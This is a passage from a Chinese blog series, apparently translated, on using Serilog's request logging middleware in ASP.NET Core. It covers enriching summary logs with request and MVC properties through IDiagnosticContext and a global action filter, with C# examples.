class="line"></span><br><span class="line"># Standard logging from ASP.NET Core infrastructure</span><br><span class="line">[14:15:45 INF] Request finished in 274.283ms 200 text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;关于此日志，有几点需要说明下：</p>
<ul>
<li>它在一条消息中包含您想要的大多数相关信息 —— HTTP 方法，URL 路径，状态代码，持续时间。</li>
<li>显示的持续时间<strong>略</strong>短于 Kestrel 在后续消息中记录的值。这是可以预期的，因为 Serilog 仅在请求到达其中间件时才开始计时，而在返回时停止计时（在生成响应之后）。</li>
<li>在这两种情况下，使用结构日志记录时都会记录其他值。例如，记录了 RequestId 和 SpanId（<a href="https://devblogs.microsoft.com/aspnet/improvements-in-net-core-3-0-for-troubleshooting-and-monitoring-distributed-apps/" target="_blank" rel="noopener">用于跟踪功能</a>），因为它们是日志记录范围的一部分。您可以在登录到 seq 的请求的以下图像中看到这一点。</li>
<li>默认情况下，我们确实会丢失一些信息。例如，不再记录终结点名称和 Razor 页面处理程序。在后续文章中，我将展示如何将它们添加到摘要日志中。</li>
<li>如果想要通过<code>http://localhost:5341</code>访问 UI，你可能需要下载 seq 进行安装。由于某种不知名的原因，可能下载会很慢。所以当然你也可以关注公众号 “DotNetCore实战” 然后回复关键字 “seq” 获取下载地址。</li>
</ul>
<figure class="image-box">
                <img src="1.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;完成整理工作所剩下的就是过滤掉我们当前正在记录的信息级日志消息。在 <em>Program.cs</em> 中更新 Serilog 配置以添加额外的过滤器：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Log.Logger = <span class="keyword">new</span> LoggerConfiguration()</span><br><span class="line">    .MinimumLevel.Debug()</span><br><span class="line">    .MinimumLevel.Override(<span class="string">"Microsoft"</span>, LogEventLevel.Information)</span><br><span class="line">    <span class="comment">// Filter out ASP.NET Core infrastructre logs that are Information and below</span></span><br><span class="line">    .MinimumLevel.Override(<span class="string">"Microsoft.AspNetCore"</span>, LogEventLevel.Warning) </span><br><span class="line">    .Enrich.FromLogContext()</span><br><span class="line">    .WriteTo.Console()</span><br><span class="line">    .WriteTo.Seq(<span class="string">"http://localhost:5341"</span>)</span><br><span class="line">    .CreateLogger();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;通过最后的更改，您现在将获得一组干净的请求日志，其中包含每个请求的摘要数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[14:29:53 INF] HTTP GET / responded 200 in 129.9509 ms</span><br><span class="line">[14:29:56 INF] HTTP GET /Privacy responded 200 in 10.0724 ms</span><br><span class="line">[14:29:57 INF] HTTP GET / responded 200 in 3.3341 ms</span><br><span class="line">[14:30:54 INF] HTTP GET /Missing responded 404 in 16.7119 ms</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在下一篇文章中，我将介绍如何通过记录其他数据来增强此日志。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;在本文中，我描述了如何使用 <em>Serilog.AspNetCore</em> 的请求日志记录中间件来减少为每个 ASP.NET Core 请求生成的日志数，同时仍记录摘要数据。如果您已经在使用 Serilog，则非常容易启用。只需在您的 <em>Startup.cs</em> 文件中调用<code>UseSerilogRequestLogging()</code>。<br>&emsp;&emsp;当请求到达此中间件时，它将启动计时器。当后续的中间件生成响应（或引发异常）时，响应将通过中间件管道返回到请求记录器，记录器记录结果并编写摘要日志消息。<br>&emsp;&emsp;添加请求日志记录中间件之后，您可以过滤掉默认情况下在 ASP.NET Core 3.0 中生成的更多基础结构日志，而不会丢失有用的信息。</p>
<hr>
<h1 id="使用-Serilog-记录所选的终结点属性"><a href="#使用-Serilog-记录所选的终结点属性" class="headerlink" title="使用 Serilog 记录所选的终结点属性"></a>使用 Serilog 记录所选的终结点属性</h1><p>&emsp;&emsp;在我的上一篇文章中，我描述了如何配置 Serilog 的 RequestLogging 中间件为每个请求创建“摘要”日志，以替换默认情况下从 ASP.NET Core 获取的 10 个或更多日志。</p>
<p>&emsp;&emsp;在本文中，我将展示如何向 Serilog 的摘要请求日志中添加其他元数据，例如请求的主机名，响应的内容类型或从 ASP.NET Core 3.0 中使用的<a href="https://docs.microsoft.com/en-us/aspnet/core/fundamentals/routing?view=aspnetcore-3.0#endpoint-routing-differences-from-earlier-versions-of-routing" target="_blank" rel="noopener">终结点路由中间件</a>所选择的端点名称。</p>
<h2 id="ASP-NET-Core-基础结构日志很详细，但是默认情况下具有太多详细信息"><a href="#ASP-NET-Core-基础结构日志很详细，但是默认情况下具有太多详细信息" class="headerlink" title="ASP.NET Core 基础结构日志很详细，但是默认情况下具有太多详细信息"></a>ASP.NET Core 基础结构日志很详细，但是默认情况下具有太多详细信息</h2><p>&emsp;&emsp;正如我在上一篇文章中所展示的那样，在开发环境中，ASP.NET Core 基础架构将为每一个 RazorPage 处理程序生成 10 条日志消息：</p>
<figure class="image-box">
                <img src="2.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;通过安装了 <a href="https://github.com/serilog/serilog-aspnetcore" target="_blank" rel="noopener">Serilog.AspNetCore</a> 的 NuGet 包后并引入<code>RequestLoggingMiddleware</code>之后，可以将其精简为一条日志消息：</p>
<figure class="image-box">
                <img src="3.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;本文中使用的所有日志图片均来自一款优秀的为结构化日志提供可视化界面的工具 —— <a href="https://datalust.co/seq" target="_blank" rel="noopener">Seq</a></p>
</blockquote>
<p>&emsp;&emsp;显然，原始的日志集更加冗长，并且其中大部分不是特别有用的信息。但是，如果您将原始的 10 条日志作为一个整体来看，则与 Serilog 摘要日志相比，它们确实会在结构日志模板中记录一些其他属性。</p>
<p>&emsp;&emsp;由 ASP.NET Core 基础结构记录的而 Serilog 未记录的扩展内容包括（下面这些还是英文的看着顺眼）：</p>
<ul>
<li>Host (<code>localhost:5001</code>)</li>
<li>Scheme (<code>https</code>)</li>
<li>Protocol (<code>HTTP/2</code>)</li>
<li>QueryString (<code>test=true</code>)</li>
<li>EndpointName (<code>/Index</code>)</li>
<li>HandlerName (<code>OnGet</code>/<code>SerilogRequestLogging.Pages.IndexModel.OnGet</code>)</li>
<li>ActionId (<code>1fbc88fa-42db-424f-b32b-c2d0994463f1</code>)</li>
<li>ActionName (<code>/Index</code>)</li>
<li>RouteData (<code>{page = &quot;/Index&quot;}</code>)</li>
<li>ValidationState (<code>True</code>/<code>False</code>)</li>
<li>ActionResult (<code>PageResult</code>)</li>
<li>ContentType (<code>text/html; charset=utf-8</code>)</li>
</ul>
<p>&emsp;&emsp;我认为如果要把上述属性中的其中一些包含在摘要日志消息中，将非常有用。例如，如果您的应用程序绑定到多个主机名，那么<code>Host</code>绝对是重要的日志。<code>QueryString</code>可能是另一个有用的字段。<code>EndpointName</code>/<code>HandlerName</code>，<code>ActionId</code>和<code>ActionName</code>似乎不那么重要，因为您应该能够推断出给定的请求路径，但是显式记录它们将帮助您更加方便的捕获错误，并使过滤针对特定操作的所有请求变得更加容易。</p>
<p>&emsp;&emsp;概括地说，您可以将这些属性分为两类：</p>
<ul>
<li><em>请求</em> / <em>响应</em> 特性：如<code>Host</code>，<code>Scheme</code>，<code>ContentType</code>，<code>QueryString</code>，<code>EndpointName</code></li>
<li><em>MVC</em> / <em>RazorPages</em> 相关的属性：如<code>HandlerName</code>，<code>ActionId</code>，<code>ActionResult</code>等</li>
</ul>
<p>&emsp;&emsp;在这篇文章中，我将展示如何添加这些类别中的第一种，即与请求/响应相关的属性，在下一篇文章中，我将展示如何添加基于 MVC / RazorPages 的属性。</p>
<h2 id="向-Serilog-请求日志添加扩展数据"><a href="#向-Serilog-请求日志添加扩展数据" class="headerlink" title="向 Serilog 请求日志添加扩展数据"></a>向 Serilog 请求日志添加扩展数据</h2><p>&emsp;&emsp;在上一篇文章中，我展示了如何将 Serilog 请求日志记录添加到您的应用程序中，因此在此不再赘述。现在，我假设您已经进行了设置，并且您拥有一个包含以下内容的<code>Startup.Configure</code>方法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... Error handling/HTTPS middleware</span></span><br><span class="line">    app.UseStaticFiles();</span><br><span class="line"></span><br><span class="line">    app.UseSerilogRequestLogging(); <span class="comment">// &lt;-- Add this line</span></span><br><span class="line"></span><br><span class="line">    app.UseRouting();</span><br><span class="line">    app.UseAuthorization();</span><br><span class="line">    app.UseEndpoints(endpoints =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        endpoints.MapRazorPages();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;该<code>UseSerilogRequestLogging()</code>扩展方法将 Serilog <code>RequestLoggingMiddleware</code>添加到请求管道中。您还可以通过调用重载来<a href="https://github.com/serilog/serilog-aspnetcore/blob/ffed9d231aefc3de7c13a03a570fb45c326632b0/src/Serilog.AspNetCore/AspNetCore/RequestLoggingOptions.cs" target="_blank" rel="noopener">配置<code>RequestLoggingOptions</code>的实例</a>。此类具有几个属性，可以让您自定义请求记录器如何生成日志语句：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RequestLoggingOptions</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> MessageTemplate &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> Func&lt;HttpContext, <span class="keyword">double</span>, Exception, LogEventLevel&gt; GetLevel &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> Action&lt;IDiagnosticContext, HttpContext&gt; EnrichDiagnosticContext &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;该<code>MessageTemplate</code>属性控制将日志呈现为的字符串格式，<code>GetLevel</code>允许您控制给定日志索要记录的级别，如<code>Debug</code>/<code>Info</code>/<code>Warning</code>等。这里我们所关心的是<code>EnrichDiagnosticContext</code>属性。<br>&emsp;&emsp;设置了该属性的<code>Action&lt;&gt;</code>之后，在生成日志消息时它将被 Serilog 中间件调用并执行。它在日志写入<strong>之前</strong>运行，这意味着它在中间件管道执行<strong>之后</strong>运行。例如，在下图中（<a href="https://www.manning.com/books/asp-dot-net-core-in-action?a_aid=aspnetcore-in-action&a_bid=5b1b11eb" target="_blank" rel="noopener">取自我的书《ASP.NET Core in Action》</a>），当响应“回传”到中间件管道时，在第 5 步写入日志：</p>
<figure class="image-box">
                <img src="4.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在管道处理<strong>之后</strong>写入日志这一事实意味着两件事：</p>
<ul>
<li>我们可以访问 <em>Response</em> 的属性，例如状态码，经过的时间或内容类型</li>
<li>我们可以访问在管道后面设置的中间件的<strong>功能</strong>，例如，由<code>EndpointRoutingMiddleware</code>（通过<code>UseRouting()</code>添加的）设置的功能：<code>IEndpointFeature</code></li>
</ul>
<p>&emsp;&emsp;在下一部分中，我将提供一个帮助程序功能，该功能会将所有“缺少”属性添加到 Serilog 请求日志消息中。</p>
<h2 id="在-IDiagnosticContext-中设置扩展值"><a href="#在-IDiagnosticContext-中设置扩展值" class="headerlink" title="在 IDiagnosticContext 中设置扩展值"></a>在 IDiagnosticContext 中设置扩展值</h2><p>&emsp;&emsp;<em>Serilog.AspNetCore</em> 会将接口<code>IDiagnosticContext</code>作为单例添加到 DI 容器中，因此您可以从任何类中访问它。然后，您可以调用<code>Set()</code>方法，将其他属性附加到请求日志消息中。</p>
<p>&emsp;&emsp;例如，<a href="https://github.com/serilog/serilog-aspnetcore#request-logging" target="_blank" rel="noopener">如文档所示</a>，您可以从操作方法中添加任意值：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">HomeController</span> : <span class="title">Controller</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">readonly</span> IDiagnosticContext _diagnosticContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HomeController</span>(<span class="params">IDiagnosticContext diagnosticContext</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _diagnosticContext = diagnosticContext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">Index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// The request completion event will carry this property</span></span><br><span class="line">        _diagnosticContext.Set(<span class="string">"CatalogLoadTime"</span>, <span class="number">1423</span>);</span><br><span class="line">        <span class="keyword">return</span> View();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后，结果摘要日志将包含属性<code>CatalogLoadTime</code>。</p>
<p>&emsp;&emsp;<code>RequestLoggingOptions</code>通过设置所提供<code>IDiagnosticContext</code>实例的值，我们基本上使用完全相同的方法来定制中间件所使用的方法。<br>&emsp;&emsp;下面的静态帮助器类从当前<code>HttpContext</code>上下文检索值，并在值可用时对其进行设置。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">LogHelper</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">EnrichFromRequest</span>(<span class="params">IDiagnosticContext diagnosticContext, HttpContext httpContext</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> request = httpContext.Request;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set all the common properties available for every request</span></span><br><span class="line">        diagnosticContext.Set(<span class="string">"Host"</span>, request.Host);</span><br><span class="line">        diagnosticContext.Set(<span class="string">"Protocol"</span>, request.Protocol);</span><br><span class="line">        diagnosticContext.Set(<span class="string">"Scheme"</span>, request.Scheme);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Only set it if available. You're not sending sensitive data in a querystring right?!</span></span><br><span class="line">        <span class="keyword">if</span>(request.QueryString.HasValue)</span><br><span class="line">        &#123;</span><br><span class="line">            diagnosticContext.Set(<span class="string">"QueryString"</span>, request.QueryString.Value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the content-type of the Response at this point</span></span><br><span class="line">        diagnosticContext.Set(<span class="string">"ContentType"</span>, httpContext.Response.ContentType);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Retrieve the IEndpointFeature selected for the request</span></span><br><span class="line">        <span class="keyword">var</span> endpoint = httpContext.GetEndpoint();</span><br><span class="line">        <span class="keyword">if</span> (endpoint <span class="keyword">is</span> <span class="keyword">object</span>) <span class="comment">// endpoint != null</span></span><br><span class="line">        &#123;</span><br><span class="line">            diagnosticContext.Set(<span class="string">"EndpointName"</span>, endpoint.DisplayName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面的帮助器函数从 “Request”，“Response” 以及其他中间件（端点名称）设置的功能中检索值。您可以扩展它，以根据需要在请求中添加其他值。</p>
<p>&emsp;&emsp;您可以在你的<code>Startup.Configure()</code>方法中通过调用<code>UseSerilogRequestLogging</code>的<code>EnrichDiagnosticContext</code>属性，来注册上面的帮助类：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... Other middleware</span></span><br><span class="line"></span><br><span class="line">    app.UseSerilogRequestLogging(opts</span><br><span class="line">        =&gt; opts.EnrichDiagnosticContext = LogHelper.EnrichFromRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... Other middleware</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在，当您发出请求时，您将看到添加到 Serilog 结构化日志中的所有其他属性：</p>
<figure class="image-box">
                <img src="5.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;只要您具有通过当前 HttpContext 可供中间件管道使用的值，就可以使用此方法。但是 MVC 的相关属性是个例外，它们是 MVC 中间件“内部”的特性，例如 action 名称或 RazorPage 处理程序名称。在下一篇文章中，我将展示如何将它们添加到 Serilog 请求日志中。</p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;默认情况下，用 Serilog 的请求日志记录中间件替换 ASP.NET Core 基础结构日志记录时，与开发环境的默认日志记录配置相比，您会丢失一些信息。在本文中，我展示了如何通过自定义 Serilog <code>RequestLoggingOptions</code>来添加这些附加属性。<br>&emsp;&emsp;这样的做法非常简单 —— 您可以访问<code>HttpContext</code>，因此你可以检索它包含的任何可用的值，并将它们设置为<code>IDiagnosticContext</code>所提供的属性。这些属性将作为附加属性添加到 Serilog 生成的结构化日志中。在下一篇文章中，我将展示如何将 MVC 特定的属性值添加到请求日志中。敬请期待吧！</p>
<hr>
<h1 id="使用-Serilog-AspNetCore-记录-MVC-属性"><a href="#使用-Serilog-AspNetCore-记录-MVC-属性" class="headerlink" title="使用 Serilog.AspNetCore 记录 MVC 属性"></a>使用 Serilog.AspNetCore 记录 MVC 属性</h1><p>&emsp;&emsp;在我上篇文章中，我描述了如何配置 Serilog 的 RequestLogging 中间件以向 Serilog 的请求日志摘要中添加其他属性（例如请求主机名或选定的端点名称）。这些属性都在<code>HttpContext</code>中可用，因此可以由中间件本身直接添加。<br>&emsp;&emsp;其他属性，例如 MVC 特定的功能，像操作方法 ID，RazorPages 处理程序名称或 ModelValidationState，<strong>仅</strong>在 MVC 上下文中可用，因此 Serilog 的中间件不能直接访问。<br>&emsp;&emsp;在本文中，我将展示如何创建<code>action</code>/<code>page</code>过滤器来为您记录这些属性，以便中间件可以在后续创建日志时访问。</p>
<blockquote>
<p>&emsp;&emsp;<a href="https://nblumhardt.com/2019/10/serilog-mvc-logging/" target="_blank" rel="noopener">Serilog 的创建者 Nicholas Blumhardt 之前已经解决了这个话题</a>。解决方案非常相似，尽管他在他的示例中创建了一个特性，您可以使用该特性来装饰 <em>actions / controllers</em> 。我在本文中跳过了这种方法，并要求将其全局应用，我希望这将是常见的解决方案。</p>
</blockquote>
<h2 id="记录来自-MVC-的其他信息"><a href="#记录来自-MVC-的其他信息" class="headerlink" title="记录来自 MVC 的其他信息"></a>记录来自 MVC 的其他信息</h2><p>&emsp;&emsp;就目前而言，ASP.NET Core 中的一个特征是许多行为被 MVC “基础结构”锁定在了 MVC 框架内部来实现。端点路由是采用 MVC 功能并将其下移到核心框架中的首要工作之一。ASP.NET Core 团队一直在努力将更多 MVC 特定功能（例如模型绑定或操作结果）从 MVC 中移除，然后“下推”到核心框架中。<a href="https://www.youtube.com/watch?v=7dJBmV_psW0" target="_blank" rel="noopener">有关此内容的更多信息，请参见 Ryan Nowak 在 NDC 上对 Houdini 项目的讨论</a>。</p>
<p>&emsp;&emsp;但是，就目前情况而言，MVC 内仍然存在一些不容易从应用程序其他部分访问的特性。当我们考虑到我们的 <a href="https://www.cnblogs.com/yilezhu/p/12215934.html" target="_blank" rel="noopener">Serilog 的请求记录中间件</a>的时候，这意味着有些属性我们也是不容易记录的。例如：</p>
<ul>
<li>HandlerName（<code>OnGet</code>）</li>
<li>ActionId（<code>1fbc88fa-42db-424f-b32b-c2d0994463f1</code>）</li>
<li>ActionName（<code>MyController.SomeApiMethod (MyTestApp)</code>）</li>
<li>RouteData（<code>{action = &quot;SomeApiMethod&quot;, controller = &quot;My&quot;, page = &quot;&quot;}</code>）</li>
<li>ValidationState（<code>True</code>/<code>False</code>）</li>
</ul>
<p>&emsp;&emsp;在上一篇文章中我展示了如何使用 RequestLogging 中间件的扩展方法通过使用<code>IDiagnosticContext</code>将附加属性写入 Serilog 的请求日志中。这也仅适用于在<code>HttpContext</code>可用的值。在这篇文章中，我将展示如何在<a href="https://docs.microsoft.com/en-us/aspnet/core/mvc/controllers/filters?view=aspnetcore-3.0" target="_blank" rel="noopener">过滤器</a>中使用<code>IDiagnosticContext</code>，以及将 MVC 特定值添加到日志中。我还将展示如何在 <a href="https://docs.microsoft.com/en-us/aspnet/core/razor-pages/filter?view=aspnetcore-3.0#implement-razor-page-filters-globally" target="_blank" rel="noopener">page 过滤器</a>中添加 RazorPages 特定的值（如<code>HandlerName</code>）。</p>
<h2 id="使用自定义过滤器记录-MVC-属性"><a href="#使用自定义过滤器记录-MVC-属性" class="headerlink" title="使用自定义过滤器记录 MVC 属性"></a>使用自定义过滤器记录 MVC 属性</h2><p>&emsp;&emsp;过滤器相当于为每个请求运行的类似于 MVC 的微型中间件管道。.NET Core MVC 中有多种类型的过滤器，每种类型的过滤器在 MVC 过滤器管道中的有着不同的用途（<a href="https://andrewlock.net/asp-net-core-in-action-filters/" target="_blank" rel="noopener">有关更多详细信息，请参见此文章</a>）。在本文中，我们将使用最常见的过滤器之一，即 Action 过滤器。<br>&emsp;&emsp;Action 过滤器在执行 MVC 操作方法之前和之后运行。他们可以访问许多 MVC 属性的值，例如正在执行的 Action 及其将被调用的参数。<br>&emsp;&emsp;下面的 Action 过滤器直接实现<code>IActionFilter</code>。该<code>OnActionExecuting</code>方法在调用 action 方法之前被调用，并将额外的 MVC 特定属性添加到通过构造函数传入的<code>IDiagnosticContext</code>中。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SerilogLoggingActionFilter</span> : <span class="title">IActionFilter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IDiagnosticContext _diagnosticContext;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerilogLoggingActionFilter</span>(<span class="params">IDiagnosticContext diagnosticContext</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _diagnosticContext = diagnosticContext ?? <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="keyword">nameof</span>(diagnosticContext));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnActionExecuting</span>(<span class="params">ActionExecutingContext context</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _diagnosticContext.Set(<span class="string">"RouteData"</span>, context.ActionDescriptor.RouteValues);</span><br><span class="line">        _diagnosticContext.Set(<span class="string">"ActionName"</span>, context.ActionDescriptor.DisplayName);</span><br><span class="line">        _diagnosticContext.Set(<span class="string">"ActionId"</span>, context.ActionDescriptor.Id);</span><br><span class="line">        _diagnosticContext.Set(<span class="string">"ValidationState"</span>, context.ModelState.IsValid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Required by the interface</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnActionExecuted</span>(<span class="params">ActionExecutedContext context</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在将 MVC 服务添加到应用程序中时，可以在以下位置全局注册过滤器<code>Startup.ConfigureServices()</code>：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddControllers(opts =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        opts.Filters.Add&lt;SerilogLoggingPageFilter&gt;();</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// ... other service registration</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&emsp;&emsp;无论你使用<code>AddControllers</code>，<code>AddControllersWithViews</code>，<code>AddMvc</code>，或<code>AddMvcCore</code>的方式你都可以采用同样的方式来添加全局过滤器。</p>
</blockquote>
<p>&emsp;&emsp;有了这个配置之后，如果你调用一个 MVC 控制器，你在 Serilog 的请求日志消息中会看到额外的数据（<code>ActionName</code>，<code>ActionId</code>，和<code>RouteData</code>，<code>ValidationState</code>）记录：</p>
<figure class="image-box">
                <img src="6.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;您可以在此处将所需的任何其他数据添加到日志中。只需注意记录参数值 —— 切记不要记录敏感或个人身份信息！</p>
<blockquote>
<p>&emsp;&emsp;<a href="https://nblumhardt.com/2019/10/serilog-mvc-logging/" target="_blank" rel="noopener">Nicholas Blumhardt 在他的帖子中建议</a>的 Action 过滤器是从<code>ActionFilterAttribute</code>派生的，因此可以将其直接用作控制器和 Action 的特性。不幸的是，这意味着您必须使用服务定位来从每个请求的<code>HttpContext</code>中检索单例的<code>IDiagnosticContext</code>。<br>我的方法可以改用构造函数注入，但是不建议将其用作属性，因此必须如上所述全局使用。而且，MVC 将在我的实现中使用作用域生存期，而不是单例，因此它会在每个请求中创建一个新实例。</p>
</blockquote>
<p>&emsp;&emsp;如果要记录其他集中 MVC 过滤器中的值，则可以以相同的方式实现其他过滤器，例如资源过滤器，结果过滤器或授权过滤器。</p>
<h2 id="使用自定义-page-过滤器记录-RazorPages-属性"><a href="#使用自定义-page-过滤器记录-RazorPages-属性" class="headerlink" title="使用自定义 page 过滤器记录 RazorPages 属性"></a>使用自定义 page 过滤器记录 RazorPages 属性</h2><p>&emsp;&emsp;上面实现的<code>IActionFilter</code>过滤器在 MVC 和 API 控制器上能够正常运行，但它<strong>不会</strong>对 RazorPages 起作用。如果要为选择的给定 Razor 页面记录 HandlerName，则需要创建一个自定义的<code>IPageFilter</code>。</p>
<p>&emsp;&emsp;页面过滤器直接类似于 Action 过滤器，但它们仅适用于 Razor 页面。以下示例从<code>PageHandlerSelectedContext</code>中检索处理程序名称并将其记录为属性<code>RazorPageHandler</code>。在这种情况下，还需要一些样板代码，但过滤器的功能还是非常基础的 —— 调用<code>IDiagnosticContext.Set()</code>以记录属性。</p>
